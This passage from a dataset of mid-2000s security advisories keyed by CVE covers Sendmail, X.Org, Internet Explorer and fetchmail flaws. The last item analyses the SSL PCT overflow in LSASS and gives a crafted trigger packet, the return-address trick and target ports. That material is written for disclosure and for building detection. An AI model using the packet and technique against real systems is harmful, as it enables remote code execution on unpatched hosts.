time intervals, it is possible for a remote attacker to corrupt arbitrary
stack memory and gain control of the affected host.
ISS Protection Strategy:
ISS has provided preemptive protection for these vulnerabilities. We
recommend that all customers apply applicable ISS product updates.
Network Sensor 7.0 and Proventia A:
XPU 24.29 / 2/14/06
SMTP_Timeout_Bo
Proventia G100/G200/G1000/G1200 prior to Firmware Version 1.2:
XPU 24.29 / 2/14/06
SMTP_Timeout_Bo
Proventia G100/G200/G1000/G1200/G400/G2000 Firmware Version 1.2 or
later:
XPU 1.68 / 2/14/06
SMTP_Timeout_Bo
Proventia M:
XPU 1.68 / 2/14/06
SMTP_Timeout_Bo
Server Sensor 7.0:
Buffer Overflow Exploit Protection (BOEP)
XPU 24.29 / 2/14/06
SMTP_Timeout_Bo
Proventia Server:
Buffer Overflow Exploit Protection (BOEP)
Version 1.0.914.300 / 2/14/06
SMTP_Timeout_Bo
Proventia Desktop:
Buffer Overflow Exploit Protection (BOEP)
Version 8.0.675.1200 / 2/14/06
SMTP_Timeout_Bo
RealSecure Desktop 7.0:
Version EOZ / 2/14/06
SMTP_Timeout_Bo
BlackICE Agent for Server 3.6:
Version EOZ / 2/14/06
SMTP_Timeout_Bo
BlackICE PC Protection 3.6:
Version COZ / 2/14/06
SMTP_Timeout_Bo
BlackICE Server Protection 3.6:
Version COZ / 2/14/06
SMTP_Timeout_Bo
These updates are now available from the ISS Download Center at:
http://www.iss.net/download.
Business Impact:
Compromise of networks and machines using affected versions of Sendmail
may lead to exposure of confidential information, loss of productivity,
and further network compromise. An attacker does not need to entice any
kind of user interaction to trigger this vulnerability.
Successful exploitation would grant an attacker the privileges that the
sendmail server daemon is running with.
Affected Products:
Sendmail 8.13.X – all versions
Note: SendmailX is NOT affected by this vulnerability.
Description:
Sendmail is a popular SMTP server daemon used on mail gateways and
forwarders to route and deliver email. It is primarily used in
UNIX server environments, although versions exist for Windows as well.
Sendmail contains a signal race vulnerability when receiving and
processing mail data from remote clients. Sendmail utilizes a signal
handler for dealing with timeouts that is not async-safe and interruption
of certain functions by this signal handler will cause static data
elements to be left in an inconsistent state. These data elements can be
used to write data to invalid parts of the stack (or heap in some
scenarios), thus taking control of the vulnerable process.
In order to exploit this vulnerability, an attacker simply needs to be
able to connect to sendmail SMTP server. This is a multi-shot exploit,
meaning the attacker can attempt to exploit it an indefinite amount
of times, since sendmail spawns a new process for each connected
client.
The ISS X-Press Updates detailed above have the ability to protect
against attack attempts targeted at Sendmail.
Additional Information:
Sendmail Security Bulletin:
http://www.sendmail.org/8.13.6.html
Credit:
This vulnerability was discovered and researched by Mark Dowd of the ISS X-Force.
______
About Internet Security Systems, Inc.
Internet Security Systems, Inc. (ISS) is the trusted security advisor
to thousands of the world’s leading businesses and governments,
providing preemptive protection for networks, desktops and
servers. An established leader in security since 1994, ISS’
integrated security platform automatically protects against both
known and unknown threats, keeping networks up and running and
shielding customers from online attacks before they impact business
assets. ISS products and services are based on the proactive
security intelligence of its X-Force® research and development
team – the unequivocal world authority in vulnerability
and threat research. ISS’ product line is also complemented
by comprehensive Managed Security Services. For more information,
visit the Internet Security Systems Web site at www.iss.net
or call 800-776-2362.
==="
32178,"[CVE-2006-0745] X.Org Security Advisory: privilege escalation and DoS in X11R6.9, X11R7.0",,CVE-2006-0745,"X.Org Security Advisory, March 20th 2006
Local privilege escalation in X.Org server 1.0.0 and later; X11R6.9.0
and X11R7.0
CVE-ID: CVE-2006-0745
Overview:
During the analysis of results from the Coverity code review of X.Org,
we discovered a flaw in the server that allows local users to execute
arbitrary code with root privileges, or cause a denial of service by
overwriting files on the system, again with root privileges.
Vulnerability details:
When parsing arguments, the server takes care to check that only root
can pass the options -modulepath, which determines the location to load
many modules providing server functionality from, and -logfile, which
determines the location of the logfile. Normally, these locations
cannot be changed by unprivileged users.
This test was changed to test the effective UID as well as the real UID
in X.Org. The test is defective in that it tested the address of the
geteuid function, not the result of the function itself. As a result,
given that the address of geteuid() is always non-zero, an unpriviliged
user can load modules from any location on the filesystem with root
privileges, or overwrite critical system files with the server log.
Affected versions:
xorg-server 1.0.0, as shipped with X11R7.0, and all release candidates
of X11R7.0, is vulnerable.
X11R6.9.0, and all release candidates, are vulnerable.
X11R6.8.2 and earlier versions are not vulnerable.
To check which version you have, run Xorg -version:
% Xorg -version
X Window System Version 7.0.0
Release Date: 21 December 2005
X Protocol Version 11, Revision 0, Release 7.0
[...]
Fix:
Apply the patch below to xorg-server-1.0.0 and 1.0.1 from the modular
X11R7 tree:
80db6a3ab76334061ec6102e74ef5607 xorg-server-1.0.1-geteuid.diff
44b44fa3efc63697eefadc7c2a1bfa50a35eec91 xorg-server-1.0.1-geteuid.diff
http://xorg.freedesktop.org/releases/X11R7.0/patches/
Alternately, xorg-server 1.0.2 has been released with this and other
code fixes:
5cd3316f07ed32a05cbd69e73a71bc74 xorg-server-1.0.2.tar.bz2
b2257e984c5111093ca80f1f63a7a9befa20b6c0 xorg-server-1.0.2.tar.bz2
f44f0f07136791ed7a4028bd0dd5eae3 xorg-server-1.0.2.tar.gz
3f5c98c31fe3ee51d63bb1ee9467b8c3fcaff5f3 xorg-server-1.0.2.tar.gz
http://xorg.freedesktop.org/releases/individual/xserver/
Apply the patch below to the X.Org server as distributed with X11R6.9:
de85e59b8906f76a52ec9162ec6c0b63 x11r6.9.0-geteuid.diff
f9b73b7c1bd7d6d6db6d23741d5d1125eea5f860 x11r6.9.0-geteuid.diff
http://xorg.freedesktop.org/releases/X11R6.9.0/patches/
Thanks:
We would like to thank Coverity for the use of their Prevent code audit
tool, which discovered this particular flaw."
32778,Advisory: Internet Explorer Drag and Drop Redeux [CVE-2005-3240] (fwd),,CVE-2005-3240,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: RIPEMD160
My apologies to those who are receiving this late or are otherwise
inconvenienced by the staggered release. I had unexpected, last-minute
travel issues that interfered somewhat with today's release.
Of note since the initial drafting of the advisory is that Microsoft has
released a blog post on the MSRC blog about the vulnerability report,
which can be read here:
http://blogs.technet.com/msrc/archive/2006/02/13/419439.aspx
The technical/strategic points about the exploit that are raised in the
post are indeed accurate (though it references MS05-014, when I believe
the correct reference is MS05-008/MS05-013). The exploit has a greater
dependence on timing than previous, related attacks. As such,
Microsoft's decision not to include this issue in a standalone patch is
seemingly justified at this point. However, the point of disagreement
with Microsoft remains the choice of release *timeline*.
I released the information about this issue to a trusted colleague (Gadi
Evron) for publication today, after what I felt was a reasonable time,
in light of my difficulties obtaining internet access.
Though there are disagreements between myself and Microsoft about the
nature of this vulnerability, I would like to thank Brian Schafer of the
MSRC for adhering to a high level of professionalism and technical
accuracy in that post and for continuing to work with me once it was
made clear that the issue would imminently become public.
Also of note is that there was a typo in the information I provided
originally to SecuriTeam. The proper candidate is CVE-2005-3240, not
*3840* as was originally reported by me. SecurityFocus has also
informed me that my original BID reservation was a casualty of a data
migration and that the proper BID associated with this vulnerability is
now BID 16352, which is public in full detail as of this writing.
There have also been some incorrect reports made to SecuriTeam that this
issue does not affect Windows XP Service Pack 2. These reports are not
correct -- my testing during this investigation was done exclusively on
current installations of Windows 2000 and Windows XP. These systems had
all service packs applied and all updates installed when tests were
performed.
Thanks to Gadi Evron for doing some of my bidding today and taking some
of the heat for my fat-fingers.
The final advisory, corrected with the now-accurate references is
attached with an armored-format PGP signature inline.
- --
""Social Darwinism: Try to make something idiot-proof,
nature will provide you with a better idiot.""
-- Michael Holstein
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (MingW32)
Comment: http://pgp.mit.edu:11371/pks/lookup?op=get&search=0xB5444D38
iD8DBQFD8Sb9fp4vUrVETTgRA6VJAKCL+fMJ8b+cIyOPE5Ld+3C2vgCIOgCffRW5
f1H8M88AzB9oMaE32XUUFbk=
=AVSg
-----END PGP SIGNATURE-----"
34129,fetchmail security announcement 2005-02 (CVE-2005-3088),,CVE-2005-3088,"fetchmail-SA-2005-02: security announcement
Topic: password exposure in fetchmailconf
Author: Matthias Andree
Version: 1.02
Announced: 2005-10-21
Type: insecure creation of file
Impact: passwords are written to a world-readable file
Danger: medium
Credits: Thomas Wolff, Miloslav Trmac for pointing out
that fetchmailconf 1.43.1 was also flawed
CVE Name: CVE-2005-3088
URL: http://fetchmail.berlios.de/fetchmail-SA-2005-02.txt
Affects: fetchmail version 6.2.5.2
fetchmail version 6.2.5
fetchmail version 6.2.0
fetchmailconf 1.43 (shipped with 6.2.0, 6.2.5 and 6.2.5.2)
fetchmailconf 1.43.1 (shipped separately, now withdrawn)
(other versions have not been checked but are presumed affected)
Not affected: fetchmail 6.2.9-rc6
fetchmailconf 1.43.2 (use this for fetchmail-6.2.5.2)
fetchmailconf 1.49 (shipped with 6.2.9-rc6)
fetchmail 6.3.0 (not released yet)
Corrected: 2005-09-28 01:14 UTC (SVN) - committed bugfix (r4351)
2005-10-21 - released fetchmailconf-1.43.2
2005-10-21 - released fetchmail 6.2.9-rc6
0. Release history
==================
2005-10-21 1.00 - initial version (shipped with -rc6)
2005-10-21 1.01 - marked 1.43.1 vulnerable
- revised section 4
- added Credits
2005-10-27 1.02 - reformatted section 0
- updated CVE Name to new naming scheme
1. Background
=============
fetchmail is a software package to retrieve mail from remote POP2, POP3,
IMAP, ETRN or ODMR servers and forward it to local SMTP, LMTP servers or
message delivery agents.
fetchmail ships with a graphical, Python/Tkinter based configuration
utility named ""fetchmailconf"" to help the user create configuration (run
control) files for fetchmail.
2. Problem description and Impact
=================================
The fetchmailconf program before and excluding version 1.49 opened the
run control file, wrote the configuration to it, and only then changed
the mode to 0600 (rw-------). Writing the file, which usually contains
passwords, before making it unreadable to other users, can expose
sensitive password information.
3. Workaround
=============
Run ""umask 077"", then run ""fetchmailconf"" from the same shell. After
fetchmailconf has finished, you can restore your old umask.
4. Solution
===========
For users of fetchmail-6.2.5.2:
-------------------------------
Download fetchmailconf-1.43.2.gz from fetchmail's project site
<http://developer.berlios.de/project/showfiles.php?group_id=1824&release_id=6617>,
gunzip it, then replace your existing fetchmailconf with it.
For users of fetchmail-6.2.6* or 6.2.9* before 6.2.9-rc6:
---------------------------------------------------------
update to the latest fetchmail-devel package, 6.2.9-rc6 on 2005-10-21.
<https://developer.berlios.de/project/showfiles.php?group_id=1824>
A. References
=============
fetchmail home page: <http://fetchmail.berlios.de/>
B. Copyright, License and Warranty
==================================
(C) Copyright 2005 by Matthias Andree, <matthias.andree gmx de>.
Some rights reserved.
This work is licensed under the Creative Commons
Attribution-NonCommercial-NoDerivs German License. To view a copy of
this license, visit http://creativecommons.org/licenses/by-nc-nd/2.0/de/
or send a letter to Creative Commons; 559 Nathan Abbott Way;
Stanford, California 94305; USA.
THIS WORK IS PROVIDED FREE OF CHARGE AND WITHOUT ANY WARRANTIES.
Use the information herein at your own risk.
END OF fetchmail-SA-2005-02.txt"
40417,A technical description of the SSL PCT vulnerability (CVE-2003-0719),,CVE-2003-0719,"There has been public discussions about the exploitation of
the SSL PCT vulnerability. Exploit code was made publicly available
(THCIISLame.c) and rumors of a potential worm that uses the
vulnerability as an attack vector are spreading the security news.
What follows is my analysis of the vulnerability and the method of
exploitation, it is based on the CORE IMPACT exploit module I wrote
that shipped to our customers on April 16th. The THCIISLame.c
exploit seems to be a direct port of the module's first version.
The vulnerable code is located in schannel.dll which is loaded by
LSASS.exe, a dissembly of the vulnerable code translates roughly
to the following C construct:
function(char *packet, unsigned int N)
char buf[32];
unsigned int register i;
if(N < 32)
{
memcpy(buf,packet,N);
for(i = 0; i < N; i++)
buf[i+N] = ~buf[i];
}
Compilation of the above code with optimizations and inline expansion
translates to the following ASM that can be found in LSASS.exe:
.text:781786C8 mov [ebp-60], eax
.text:781786CB mov eax, [esi+0Ch]
.text:781786CE mov ecx, eax
.text:781786D0 add esi, 30h
.text:781786D3 mov edx, ecx
.text:781786D5 lea edi, [ebp-24]
.text:781786D8 shr ecx, 2
.text:781786DB rep movsd
.text:781786DD mov ecx, edx
.text:781786DF and ecx, 3
.text:781786E2 rep movsb
.text:781786E4 xor esi, esi
.text:781786E6 test eax, eax
.text:781786E8 jbe short dontcopy
.text:781786EA
.text:781786EA loop:
.text:781786EA mov dl, [ebp+esi-24]
.text:781786EE lea ecx, [ebp+esi-24]
.text:781786F2 inc esi
.text:781786F3 not dl
.text:781786F5 cmp esi, eax
.text:781786F7 mov [ecx+eax], dl
.text:781786FA jb short loop
.text:781786FA dontcopy:
In the above C code N is a value obtained from the PCT packet.
A value higher than 0x10 is enough to trigger the overflow. A value
of 0x16 overwrites the return address. The boundary check (N<32) is done
before the call to memcpy() but the concatenation code that follows it
is logically wrong.
The vulnerability could be exploited to execute arbitrary code, for that
purpose the return address should be overwritten with an address
pointing to data controlled by the attacker, but the address of such data is
not predictable.
The usual way to reach the attacker code in Windows exploits is jumping to a portion of instructions at a known address that redirects the program flow to the attackers code. Those instructions are part of the vulnerable application code, or part of any module loaded by it, so the address depends on the application and system version, sometimes the address is the same in different version of the same modules and applications. It is part of the exploit developer's work to find those instructions to make the exploit reliable against different target configurations.
This is the approach I took for the first version of the PCT exploit, the THCISLame.c exploit uses the same technique although I have a different address.
In this case, when the vulnerable function returns to the address chosen by the attacker, there is no register pointing to the controllable data, but there is a pointer to the PCT packet on the thread's stack at [esp+6c].
If we can find a set of instructions in the vulnerable application memory equivalent to CALL [esp+6C] part of the job is done.
I used:
add esp,6c
ret
There are many occurrences of those instructions in the lsass.exe memory.
But there is still a problem to solve: The address at [esp+6c] points to the PCT packet header, so the fields of that header are going to be used
as executable code. If the PCT packet doesn't fulfil some protocol checks execution flow will not reach the vulnerable function so we need to craft a packet with valid field values and valid opcodes.
In this context a ""valid field value"" is one that allows the execution flow to reach the vulnerable function AND is also a valid opcode so as to prevent the application from crashing when it is executed.
Note that for successful exploitation, its not necessary to craft a
packet that complies with the PCT RFC (See RFC referenced at the end of this email)
The packet used on the first version of the exploit module was:
""x80x66x01x02xbdx00x01x00x01x00x16x8Fx86x01x00x00x00""
Here is a brief explanation of the values used:
Value Condition to fulfill
XX YY (RecordLength):
if(XX & 0x80)
RecordLength = ((XX & 0x7f) << 8) | YY
else
RecordLength = ((XX & 0x3f) << 8) | YY
I selected XX=0x80 and YY=0x66 which satisfies the above condition.
01 0x01 (j):= 0x01
02 BD 0x02bd (k):0x0002 <= k < 0x301 < 0x8001
Here two bytes that satisfy the above condition can be used, 0x02
and 0xbd are just arbitrarily chosen values, because I like them!
Note that 0xbd == mov ebp
00 01 0x0001 (l): > 0x0001, its better to keep it under 0x0003
00 01 0x0001 (m):<= 0x10
00 16 0x001A (N): (l+m+N+9 <= RecordLength) && (0 < N <= 0x20)
8F 0x008F (o): = 0x008F
86 01 0x8601 (p): >= 0x8001
Additionally, RecordLength must be less or equal to the packet size.
The crafted packet translates to the following ASM code:
80660102 and byte ptr [esi+0x1],0x2
bd00010001 mov ebp,0x1000100
0016 add [esi],dl
8f8601000000 pop [esi+0x1]
eb20 jmp 0016f40b
The ESI register points to writable data in both XP and 2000, the register used by the first and fourth instructions can be changed but the third (00 16) is the right size to overwrite the return address.
A jump opcode (eb xx) could be used in the first two bytes if the packet's length is modified accordingly.
Looking at the conditions that must be met for each field we can see that there are more than 25 millions different packets that will trigger the vulnerability (combinations of the possible values for XX,YY,k,l,m and p)
Modifying the value for N is also possible but would require additional
payload to overwrite portions of the memory of the running process
with valid data.
Detection of an exploitation attempt:
In view of the above, detection of an attack that exploits this
vulnerability should not rely entirely on packet bytes that can have
value arbitrary chosen.
A proper check should *at least* check for the required fixed values:
o == 0x8F
0x10 < N <= 0x20 (a value less than 0x10 does not overwrite the stack)
Relying on other packet bytes for a proper detection signature should
be subject to careful analysis as there might be other execution paths
reaching the vulnerable function.
The workaround proposed in Microsoft's bulletin MS04-011 does prevent
exploitation of this vulnerability.
After further research I've found that it may be possible to write
an exploit that doesn't need to carry a hardcoded address and would work
against Windows XP and 2000 systems independent of service pack and
hot fixes applied, except of course for MS04-011 which does fix
the problem.
Exploitation has been successfully tested against the following systems:
Windows 2000 Professional - sp4 (i386)
Windows 2000 Professional - sp3 (i386)
Windows 2000 Professional - sp2 (i386)
Windows 2000 Server - sp4 (i386)
Windows 2000 Server - sp3 (i386)
Windows 2000 Server - sp2 (i386)
Windows 2000 Advanced Server - sp4 (i386)
Windows 2000 Advanced Server - sp3 (i386)
Windows 2000 Advanced Server - sp2 (i386)
Windows XP Professional - sp0 (i386)
Windows XP Professional - sp1 (i386)
(NT 4 exploitation seems possible with the same technique.)
The following services can be used as attack vectors:
IIS 4.0
IIS 5.0
IIS 5.1
Exchange 5.0 with SSL enabled
Active Directory with SSL
The vulnerable IIS and Microsoft Exchange services are:
HTTPS 443/tcp
SMTP 25/tcp (STARTTLS)
IMAP 993/tcp,
POP3 995/tcp
NNTP 563/tcp.
Active Directory:
ldaps 636/tcp
globalcatLDAPssl 3269/tcp.
Exploitation through the Analysis Services 2000 (included with SQL Server 2000) were not researched.
PCT must be enabled and a valid certificate installed.
References:
http://www.microsoft.com/technet/security/bulletin/MS04-011.mspx
http://www.develop.com/books/pws/draft-benaloh-pct-01.txt
http://www.graphcomp.com/info/specs/ms/pct.htm
http://www.coresecurity.com/products/coreimpact/index.php
Thanks
Halvar Flake helped with the initial vulnerability analysis which
demonstrated not only his code reversing expertise but also the great
power of his bindiff tool."
